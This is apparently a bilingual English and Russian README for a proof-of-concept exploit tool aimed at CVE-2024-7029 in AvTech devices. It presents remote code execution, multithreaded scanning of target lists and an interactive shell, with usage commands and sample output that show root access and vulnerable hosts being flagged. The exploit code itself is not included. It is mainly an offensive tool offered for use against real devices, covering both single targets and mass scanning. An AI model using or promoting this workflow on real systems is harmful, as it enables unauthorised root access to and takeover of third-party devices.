
# EN
**GenAvTechRCEExploit** A PoC exploit for the CVE-2024-7029 vulnerability found in AvTech devices, allowing Remote Code Execution (RCE). This tool can scan for vulnerable devices and execute commands on them interactively.

## Features

- **Vulnerability Detection**: Check if AvTech devices are vulnerable to RCE.
- **Interactive Shell**: Execute commands on the target device via an interactive shell.
- **Multithreaded Scanning**: Scan multiple targets concurrently using multithreading.
- **Payload Execution**: Exploit targets by sending crafted payloads to execute commands remotely.

## Requirements

- Python 3.7+
- `requests` library
- `prompt_toolkit` library
- `alive_progress` library

Install the required libraries with:

```bash
pip install -r requirements.txt
```

## Usage

### Scan a Single Target

To check a single target for vulnerability and start an interactive shell:

```bash
python3 GenAvTechRCEExploit.py -u <target_url>
```

```
$ python3 GenAvTechRCEExploit.py -u http://192.168.1.100

[*] Выполняется проверка уязвимости цели...
[+] Обнаружена уязвимость на цели: http://192.168.1.100
[*] Запуск интерактивной оболочки...
Shell> whoami
root
Shell> uname -a
Linux avtech-device 4.15.0-45-generic #48-Ubuntu SMP Fri Jan 18 08:54:43 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
Shell> exit
[*] Завершение интерактивной оболочки
```


Replace `<target_url>` with the actual URL of the target device.

### Scan Multiple Targets

To scan multiple targets provided in a file (one URL per line):

```bash
python3 GenAvTechRCEExploit.py -f <file_path>
```

```
$ python3 GenAvTechRCEExploit.py -f targets.txt

Scanning Targets |████████████████████████████████████████| 100% 
[+] Обнаружена уязвимость на цели: http://192.168.1.50
[+] Обнаружена уязвимость на цели: http://192.168.1.150
[-] Цель http://192.168.1.200 не уязвима
```


Replace `<file_path>` with the path to your file containing target URLs.

### Threads

You can specify the number of threads for scanning with the `-t` option:

```bash
python3 GenAvTechRCEExploit.py -f <file_path> -t <number_of_threads>
```

By default, the number of threads is set to 10.

## Example

```bash
python3 GenAvTechRCEExploit.py -u http://192.168.1.1
python3 GenAvTechRCEExploit.py -f targets.txt -t 20
```


# RU
**GenAvTechRCEExploit** - эксплоит для CVE-2024-7029 в устройствах AvTech, позволяющая удаленное выполнение кода (RCE). Этот инструмент может сканировать уязвимые устройства и выполнять на них команды в интерактивном режиме.

## Возможности

- **Поиск уязвимостей**: Проверка устройств AvTech на уязвимость к RCE.
- **Интерактивная оболочка**: Выполнение команд на целевом устройстве через интерактивную оболочку.
- **Многопоточное сканирование**: Одновременное сканирование нескольких целей с использованием многопоточности.
- **Выполнение полезной нагрузки**: Эксплуатация целей путем отправки специально сформированной полезной нагрузки для удаленного выполнения команд.

## Требования

- Python 3.7+
- Библиотека `requests`
- Библиотека `prompt_toolkit`
- Библиотека `alive_progress`

Установить необходимые библиотеки можно с помощью:

```bash
pip install -r requirements.txt
```

## Использование

### Сканирование одной цели

Для проверки уязвимости одной цели и запуска интерактивной оболочки:

```bash
python3 GenAvTechRCEExploit.py -u <target_url>
```

```
$ python3 GenAvTechRCEExploit.py -u http://192.168.1.100

[*] Выполняется проверка уязвимости цели...
[+] Обнаружена уязвимость на цели: http://192.168.1.100
[*] Запуск интерактивной оболочки...
Shell> whoami
root
Shell> uname -a
Linux avtech-device 4.15.0-45-generic #48-Ubuntu SMP Fri Jan 18 08:54:43 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
Shell> exit
[*] Завершение интерактивной оболочки
```

Замените `<target_url>` на реальный URL целевого устройства.

### Сканирование нескольких целей

Для сканирования нескольких целей, указанных в файле (один URL на строку):

```bash
python3 GenAvTechRCEExploit.py -f <file_path>
```

```
$ python3 GenAvTechRCEExploit.py -f targets.txt

Scanning Targets |████████████████████████████████████████| 100% 
[+] Обнаружена уязвимость на цели: http://192.168.1.50
[+] Обнаружена уязвимость на цели: http://192.168.1.150
[-] Цель http://192.168.1.200 не уязвима
```

Замените `<file_path>` на путь к файлу, содержащему URL-адреса целей.

### Потоки

Вы можете указать количество потоков для сканирования с помощью опции `-t`:

```bash
python3 GenAvTechRCEExploit.py -f <file_path> -t <number_of_threads>
```

По умолчанию количество потоков установлено на 10.

## Пример

```bash
python3 GenAvTechRCEExploit.py -u http://192.168.1.1
python3 GenAvTechRCEExploit.py -f targets.txt -t 20
```
